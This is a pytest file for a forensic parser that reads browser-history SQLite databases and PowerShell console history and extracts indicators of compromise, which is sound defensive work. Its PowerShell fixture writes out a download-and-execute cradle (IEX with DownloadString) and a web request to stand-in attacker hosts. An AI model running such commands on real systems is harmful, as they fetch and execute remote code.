import os
import sqlite3

from titan_decoder.core.endpoint_parsers import (
    parse_browser_history_sqlite,
    parse_powershell_history,
)


def test_browser_sqlite_corrupt_is_graceful(tmp_path):
    # Corrupt / non-SQLite files must degrade to empty, not raise DatabaseError.
    for name, data in (
        ("random.sqlite", os.urandom(4000)),
        ("hdr.sqlite", b"SQLite format 3\x00" + os.urandom(4000)),
        ("text.sqlite", b"not a database at all\n" * 50),
        ("empty.sqlite", b""),
    ):
        p = tmp_path / name
        p.write_bytes(data)
        events, indicators = parse_browser_history_sqlite(p)
        assert events == []
        assert indicators == []


def test_browser_sqlite_chrome_history(tmp_path):
    p = tmp_path / "History"
    conn = sqlite3.connect(str(p))
    conn.execute("CREATE TABLE urls(url, title, visit_count, last_visit_time)")
    conn.execute(
        "INSERT INTO urls VALUES('http://evil.com/x', 't', 5, 13350000000000000)"
    )
    conn.commit()
    conn.close()
    events, indicators = parse_browser_history_sqlite(p)
    assert len(events) == 1
    assert any(i.value == "http://evil.com/x" for i in indicators)


def test_browser_sqlite_missing_or_wrong_schema_is_graceful(tmp_path):
    p = tmp_path / "other.sqlite"
    conn = sqlite3.connect(str(p))
    conn.execute("CREATE TABLE urls(x, y)")  # 'urls' table, wrong columns
    conn.execute("INSERT INTO urls VALUES(1, 2)")
    conn.commit()
    conn.close()
    events, indicators = parse_browser_history_sqlite(p)
    assert events == [] and indicators == []


def test_powershell_history_extracts_iocs(tmp_path):
    p = tmp_path / "ConsoleHost_history.txt"
    p.write_text(
        "whoami\n"
        "Invoke-WebRequest http://c2.evil.net/a\n"
        "IEX (New-Object Net.WebClient).DownloadString('http://drop.example.org')\n"
    )
    events, indicators = parse_powershell_history(p)
    assert len(events) == 3
    urls = {i.value for i in indicators if i.indicator_type == "urls"}
    assert "http://c2.evil.net/a" in urls
